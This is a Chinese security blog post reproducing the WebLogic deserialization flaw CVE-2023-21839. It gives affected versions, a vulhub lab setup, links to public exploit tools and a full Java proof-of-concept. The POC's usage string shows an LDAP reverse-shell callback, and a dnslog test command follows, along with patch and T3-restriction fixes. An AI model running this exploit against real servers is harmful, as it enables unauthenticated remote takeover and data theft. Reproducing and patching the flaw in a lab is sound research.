---
title: CVE-2023-21839：Weblogic反序列化漏洞
url: https://www.secpulse.com/archives/199304.html
source: 安全脉搏
date: 2023-04-21
fetch_date: 2025-10-04T11:31:25.800024
---

# CVE-2023-21839：Weblogic反序列化漏洞

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# CVE-2023-21839：Weblogic反序列化漏洞

[资讯](https://www.secpulse.com/archives/category/news)

[Timeline Sec](https://www.secpulse.com/newpage/author?author_id=33593)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2023-04-20

9,967

****关注我们❤️，添加星标?，一起学安全！****

**作者：****KimJun****@Timeline Sec**

**本文字数：1217**

**阅读时长：2～3min**

**声明：仅供学习参考使用，请勿用作违法用途，否则后果自负**

**0x01 简介**

WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。

**0x02 漏洞概述**

**漏洞编号：CVE-2023-21839**
由于Weblogic IIOP/T3协议存在缺陷，当IIOP/T3协议开启时，允许未经身份验证的攻击者通过IIOP/T3协议网络访问攻击存在安全风险的WebLogic Server，漏洞利用成功WebLogic Server可能被攻击者接管执行任意命令导致服务器沦陷或者造成严重的敏感数据泄露。

**0x03 影响版本**

Weblogic 12.2.1.3.0

Weblogic 12.2.1.4.0

Weblogic 14.1.1.0.0

**0x04 环境搭建**

可以使用使用P牛的vulhub进行漏洞环境搭建：
https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2023-21839

clone项目：

```
git clone https://github.com/vulhub/vulhub.git
```

在/weblogic/CVE-2023-21839/目录，用下面的命令下载并启动12.2.1.3版本的weblogic：

```
docker-compose up -d
```

然后访问http://your-ip:7001/console，就可以看到登录页面

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199304-1681980787.png)

**0x05 漏洞复现**

可以使用DXask88MA师傅的工具：
https://github.com/DXask88MA/Weblogic-CVE-2023-21839
选择的sink点在

```
weblogic.deployment.jms.ForeignOpaqueReference.class
```

也可以选择使用4ra1n师傅用go模拟数据包的的工具：
https://github.com/4ra1n/CVE-2023-21839
选择的sink点在

```
weblogic.jndi.internal.ForeignOpaqueReference.class
```

POC：

```
import javax.naming.Context;import javax.naming.InitialContext;import javax.naming.NamingException;import java.lang.reflect.Field;import java.util.Hashtable;import java.util.Random;
public class CVE_2023_21839 {    static String JNDI_FACTORY="weblogic.jndi.WLInitialContextFactory";    static String HOW_TO_USE="[*]java -jar 目标ip:端口 ldap地址\n e.g. java -jar 192.168.220.129:7001 ldap://192.168.31.58:1389/Basic/ReverseShell/192.168.220.129/1111";
    private static InitialContext getInitialContext(String url)throws NamingException    {        Hashtable<String,String> env = new Hashtable<String,String>();        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);        env.put(Context.PROVIDER_URL, url);        return new InitialContext(env);    }    public static void main(String args[]) throws Exception {        if(args.length <2){            System.out.println(HOW_TO_USE);            System.exit(0);        }        String t3Url = args[0];        String ldapUrl = args[1];        InitialContext c=getInitialContext("t3://"+t3Url);        Hashtable<String,String> env = new Hashtable<String,String>();        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");        weblogic.deployment.jms.ForeignOpaqueReference f=new weblogic.deployment.jms.ForeignOpaqueReference();        Field jndiEnvironment=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField("jndiEnvironment");        jndiEnvironment.setAccessible(true);        jndiEnvironment.set(f,env);        Field remoteJNDIName=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField("remoteJNDIName");        remoteJNDIName.setAccessible(true);        remoteJNDIName.set(f,ldapUrl);        String bindName = new Random(System.currentTimeMillis()).nextLong()+"";        try{            c.bind(bindName,f);            c.lookup(bindName);        }catch(Exception e){ }
    }}
```

直接使用dnslog进行测试

下载Jar文件：
https://github.com/DXask88MA/Weblogic-CVE-2023-21839/releases/tag/CVE-2023-21839

执行命令：

```
java -jar Weblogic-CVE-2023-21839.jar 127.0.0.1:7001 ldap://81c95c8f.dns.1433.eu.org/test
```

查看dnslog，收到请求，漏洞验证成功

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199304-1681980790.png)

**0x06 修复方式**

1.下载最新补丁，链接：https://support.oracle.com/rs?type=doc&id=2917213.2

2.限制T3协议访问

```
参考链接：
```

https://www.oracle.com/security-alerts/cpujan2023.html

**本文作者：[Timeline Sec](newpage/author?author_id=33593)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/199304.html**](https://www.secpulse.com/archives/199304.html)

Tags: [CVE-2023-21839](https://www.secpulse.com/archives/tag/cve-2023-21839)、[Java应用服务器](https://www.secpulse.com/archives/tag/java%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8)、[weblogic](https://www.secpulse.com/archives/tag/weblogic)、[Weblogic反序列化漏洞](https://www.secpulse.com/archives/tag/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E)、[Web应用](https://www.secpulse.com/archives/tag/web%E5%BA%94%E7%94%A8)、[反序列化漏洞](https://www.secpulse.com/archives/tag/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E)、[数据库应用](https://www.secpulse.com/archives/tag/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8)、[网络应用](https://www.secpulse.com/archives/tag/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8)

点赞：
4
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![实战！一次平平无奇内网渗透记录](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/06/1686636814877-300x152.png)

  实战！一次平平无奇内网渗透记录](https://www.secpulse.com/archives/201867.html "详细阅读 实战！一次平平无奇内网渗透记录")
* [![Java反序列化回显学习之Tomcat通用回显](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/05/1684907775563-300x214.png)

  Java反序列化回显学习之Tomcat通…](https://www.secpulse.com/archives/200930.html "详细阅读 Java反序列化回显学习之Tomcat通用回显")
* [![Weblogic 关于T3协议和二次反序列化分析](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/04/1681972431492-300x227.png)

  Weblogic 关于T3协议和二次反序…](https://www.secpulse.com/archives/199253.html "详细阅读 Weblogic 关于T3协议和二次反序列化分析")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss...